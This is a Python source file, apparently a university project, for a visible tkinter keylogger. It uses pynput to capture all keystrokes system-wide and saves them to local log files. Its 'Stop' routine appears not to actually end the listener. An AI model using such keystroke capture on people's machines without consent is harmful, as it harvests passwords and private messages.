import os
import datetime
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext
from pynput import keyboard

class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger - Educational Purpose Only")
        self.root.geometry("600x400")
        self.root.resizable(False, False)

        self.log = ""
        self.logging = False
        self.listener_thread = None

        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=70, height=20)
        self.text_area.pack(pady=10)

        self.start_button = tk.Button(root, text="Start", command=self.start_logging, width=12)
        self.start_button.pack(side=tk.LEFT, padx=10, pady=5)

        self.stop_button = tk.Button(root, text="Stop", command=self.stop_logging, width=12)
        self.stop_button.pack(side=tk.LEFT, padx=10, pady=5)

        self.clear_button = tk.Button(root, text="Clear", command=self.clear_logs, width=12)
        self.clear_button.pack(side=tk.LEFT, padx=10, pady=5)

        self.save_button = tk.Button(root, text="Save", command=self.save_logs, width=12)
        self.save_button.pack(side=tk.LEFT, padx=10, pady=5)

    def on_press(self, key):
        try:
            char = key.char if key.char else str(key)
        except AttributeError:
            char = str(key)

        self.log += f'{char} '
        self.text_area.insert(tk.END, f'{char} ')
        self.text_area.see(tk.END)

    def start_logging(self):
        if not self.logging:
            self.logging = True
            self.listener_thread = threading.Thread(target=self.listen_keys, daemon=True)
            self.listener_thread.start()
            messagebox.showinfo("Started", "Keylogger has started.")

    def listen_keys(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop_logging(self):
        self.logging = False
        keyboard.Controller().press(keyboard.Key.esc)  # force exit from listener
        messagebox.showinfo("Stopped", "Keylogger has stopped.")

    def clear_logs(self):
        self.text_area.delete('1.0', tk.END)
        self.log = ""

    def save_logs(self):
        if self.log:
            folder_path = r"C:\Users\DELL\Documents\Likitha\REVA UNIVERSITY\projects\Keylogger_python"
            os.makedirs(folder_path, exist_ok=True)

            filename = datetime.datetime.now().strftime("log_%Y-%m-%d_%H-%M-%S.txt")
            file_path = os.path.join(folder_path, filename)

            with open(file_path, 'w') as f:
                f.write(self.log)

            messagebox.showinfo("Saved", f"Logs saved to:\n{file_path}")
        else:
            messagebox.showwarning("Warning", "No logs to save.")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
